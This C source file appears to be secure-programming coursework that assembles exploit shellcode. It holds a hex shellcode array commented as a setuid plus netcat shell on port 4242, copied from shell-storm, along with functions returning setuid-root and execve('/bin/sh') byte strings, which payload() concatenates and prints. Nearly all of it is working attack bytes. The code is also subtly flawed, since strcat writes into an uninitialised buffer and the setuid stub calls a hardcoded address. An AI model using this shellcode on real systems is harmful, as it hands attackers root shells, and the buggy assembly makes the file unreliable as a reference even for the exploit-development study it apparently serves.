#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define	BLENGTH	128


/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */
/* the correcte shellcode with setuid, socket and shell */
// reverse shell (nc localhost 4242)  
// SOURCE : http://shell-storm.org/shellcode/files/shellcode-95.php  AND another github : CA647-secure-programming-master/payload
char shellcode[] = 
"\x31\xc0\x50\x50\xb0\x17\xcd\x80" 
"\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08" 
"\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d"
"\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x30\x2d\x6c\x70"
"\x34\x32\x34\x32\x30\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x30\x43\x41\x36\x34\x37"
"\x5f\x45\x4c\x49\x54\x45\x5f\x54\x45\x41\x4d";
/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */


char* 
connectSocket()
{

	return "";
}

char*
setuidRoot()
{
	//setuid(0);
/*

b8 d5 			movb    $0xd5,%eax
8b 5c 24 30		mov    0x30(%esp),%ebx
ff 15 d0 69 0f 08	call   *0x80f69d0

*/
	return  "\xb8\xd5"
		"\x8b\x5c\x24\x30"
		"\xff\x15\xd0\x69\x0f\x08";
}


/**
 From lab 6 solution to part C, by Darragh O'Brien
 launches a shell
*/
char*
launchShell()
{

	return 	"\xeb\x12\x5e\x31\xc0\x88\x46\x07"
		"\x50\x56\x31\xd2\x89\xe1\x89\xf3"
		"\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
		"\xff\x2f\x62\x69\x6e\x2f\x73\x68";
}

void
payload()
{
	char* hexPayload = (char*) malloc(BLENGTH);
	
	strcat(hexPayload, connectSocket());
	strcat(hexPayload, setuidRoot());
	strcat(hexPayload, launchShell());
	printf("%s\n", hexPayload);
}

int main()
{
	payload();
	return 0;
}
